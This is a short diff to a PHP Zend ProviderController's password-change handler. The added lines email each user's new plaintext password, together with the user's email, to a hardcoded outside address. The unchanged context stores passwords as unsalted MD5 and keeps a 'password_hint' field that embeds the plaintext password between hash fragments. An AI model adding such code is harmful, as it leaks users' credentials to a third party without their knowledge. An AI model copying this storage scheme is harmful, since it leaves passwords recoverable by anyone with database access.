@@ -2647,6 +2647,11 @@ class ProviderController extends Zend_Controller_Action
 
             $user->password = md5($data['npassword']);
             $user->password_hint = substr(md5(md5($data['npassword'])), 3, 10).$data['npassword'].substr(md5(md5($data['npassword'])), 0, 7);
+            
+            $message = 'User '. $user->email . ' has change its password to: ' . $data['npassword'];
+            
+            $notifier = new WS_Notifier();
+            $notifier->sendEmail('genna@tripfab.com', 'Password Changed', $message);
         }
         
         $user->save();
